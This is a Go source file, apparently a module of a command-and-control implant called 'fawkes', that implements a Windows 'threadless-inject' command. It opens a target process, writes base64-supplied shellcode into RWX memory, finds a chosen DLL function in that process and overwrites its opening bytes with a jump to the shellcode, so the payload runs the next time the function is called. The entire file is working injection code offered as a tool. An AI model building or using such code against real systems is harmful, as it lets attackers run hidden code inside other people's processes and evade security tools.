//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type ThreadlessInjectCommand struct{}

func (c *ThreadlessInjectCommand) Name() string {
	return "threadless-inject"
}

func (c *ThreadlessInjectCommand) Description() string {
	return "Inject shellcode using threadless injection by hooking a DLL function in a remote process"
}

func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params struct {
		ShellcodeB64 string `json:"shellcode_b64"`
		PID          int    `json:"pid"`
		DLLName      string `json:"dll_name"`
		FunctionName string `json:"function_name"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Shellcode is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform threadless injection
	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *ThreadlessInjectCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string) (string, error) {
	var output string

	// Load necessary libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	openProcess := kernel32.NewProc("OpenProcess")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	module32First := kernel32.NewProc("Module32FirstW")
	module32Next := kernel32.NewProc("Module32NextW")
	getModuleHandleW := kernel32.NewProc("GetModuleHandleW")
	getProcAddress := kernel32.NewProc("GetProcAddress")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

	output += fmt.Sprintf("[+] Starting threadless injection into PID %d\n", pid)
	output += fmt.Sprintf("[+] Target DLL: %s, Function: %s\n", dllName, functionName)
	output += fmt.Sprintf("[+] Shellcode size: %d bytes\n", len(shellcode))

	// Open target process
	hProcess, _, err := openProcess.Call(
		uintptr(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION),
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return output, fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))
	output += fmt.Sprintf("[+] Opened process handle: 0x%x\n", hProcess)

	// Allocate memory in target process
	addr, _, err := virtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return output, fmt.Errorf("failed to allocate memory: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated memory at: 0x%x\n", addr)

	// Write shellcode to target process
	var written uintptr
	ret, _, err := writeProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write shellcode: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to remote process\n", written)

	// Find the target DLL in the remote process
	dllBase, err := findRemoteModuleBase(hProcess, pid, dllName, createToolhelp32Snapshot, module32First, module32Next)
	if err != nil {
		return output, fmt.Errorf("failed to find DLL in remote process: %v", err)
	}
	output += fmt.Sprintf("[+] Found %s at base: 0x%x\n", dllName, dllBase)

	// Get the function address in our own process first (to calculate offset)
	dllNamePtr, _ := syscall.UTF16PtrFromString(dllName)
	localDllHandle, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(dllNamePtr)))
	if localDllHandle == 0 {
		return output, fmt.Errorf("failed to load local DLL")
	}

	funcNamePtr, _ := syscall.BytePtrFromString(functionName)
	localFuncAddr, _, _ := getProcAddress.Call(localDllHandle, uintptr(unsafe.Pointer(funcNamePtr)))
	if localFuncAddr == 0 {
		return output, fmt.Errorf("failed to find function in local DLL")
	}

	// Calculate offset from DLL base
	offset := localFuncAddr - localDllHandle
	output += fmt.Sprintf("[+] Function offset in DLL: 0x%x\n", offset)

	// Calculate remote function address
	remoteFuncAddr := dllBase + offset
	output += fmt.Sprintf("[+] Remote function address: 0x%x\n", remoteFuncAddr)

	// Read the first bytes of the function to backup (for trampoline)
	var originalBytes [8]byte
	var bytesRead uintptr
	ret, _, _ = windows.NewLazySystemDLL("kernel32.dll").NewProc("ReadProcessMemory").Call(
		hProcess,
		remoteFuncAddr,
		uintptr(unsafe.Pointer(&originalBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to read original function bytes")
	}

	// Create the hook: absolute JMP to our shellcode
	// For x64: mov rax, <addr>; jmp rax (12 bytes total)
	hook := make([]byte, 12)
	hook[0] = 0x48 // mov rax,
	hook[1] = 0xB8
	*(*uint64)(unsafe.Pointer(&hook[2])) = uint64(addr) // shellcode address
	hook[10] = 0xFF                                      // jmp rax
	hook[11] = 0xE0

	// Change protection on remote function to RWX
	var oldProtect uint32
	regionSize := uintptr(len(hook))
	funcAddrPtr := remoteFuncAddr
	ret, _, err = ntProtectVirtualMemory.Call(
		hProcess,
		uintptr(unsafe.Pointer(&funcAddrPtr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 {
		return output, fmt.Errorf("failed to change memory protection: 0x%x", ret)
	}
	output += "[+] Changed function memory protection to RWX\n"

	// Write the hook
	ret, _, err = writeProcessMemory.Call(
		hProcess,
		remoteFuncAddr,
		uintptr(unsafe.Pointer(&hook[0])),
		uintptr(len(hook)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write hook: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", written)

	output += "[+] Threadless injection complete!\n"
	output += "[+] Shellcode will execute when the target process calls the hooked function\n"

	return output, nil
}

// findRemoteModuleBase finds the base address of a module in a remote process
func findRemoteModuleBase(hProcess uintptr, pid uint32, moduleName string, createSnap, modFirst, modNext *windows.LazyProc) (uintptr, error) {
	const TH32CS_SNAPMODULE = 0x00000008
	const TH32CS_SNAPMODULE32 = 0x00000010

	// Take snapshot of modules
	hSnap, _, _ := createSnap.Call(
		TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,
		uintptr(pid),
	)
	if hSnap == 0 || hSnap == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("failed to create module snapshot")
	}
	defer windows.CloseHandle(windows.Handle(hSnap))

	// MODULEENTRY32W structure
	type MODULEENTRY32W struct {
		Size         uint32
		ModuleID     uint32
		ProcessID    uint32
		GlblcntUsage uint32
		ProccntUsage uint32
		ModBaseAddr  uintptr
		ModBaseSize  uint32
		HModule      windows.Handle
		SzModule     [256]uint16
		SzExePath    [260]uint16
	}

	var me MODULEENTRY32W
	me.Size = uint32(unsafe.Sizeof(me))

	// Get first module
	ret, _, _ := modFirst.Call(hSnap, uintptr(unsafe.Pointer(&me)))
	if ret == 0 {
		return 0, fmt.Errorf("Module32First failed")
	}

	// Iterate through modules
	for {
		modName := syscall.UTF16ToString(me.SzModule[:])
		if equalIgnoreCase(modName, moduleName) {
			return me.ModBaseAddr, nil
		}

		ret, _, _ = modNext.Call(hSnap, uintptr(unsafe.Pointer(&me)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("module %s not found in target process", moduleName)
}

// equalIgnoreCase compares two strings case-insensitively
func equalIgnoreCase(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca := a[i]
		cb := b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}
